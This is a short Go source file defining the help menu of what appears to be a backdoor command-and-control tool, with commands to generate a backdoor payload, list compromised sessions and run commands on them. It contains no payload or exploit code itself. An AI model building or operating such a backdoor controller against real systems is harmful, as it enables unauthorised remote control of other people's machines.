package main

var help_text string = `
Command          Description
-------          -----------
help             Print this message.
generate  [+]    Generates backdoor payload.
sessions         Display all Known sessions (will reset after restart).
use       [+]    Execute a command on a session (use <session> <command>)
exit             Quit.`+"\n"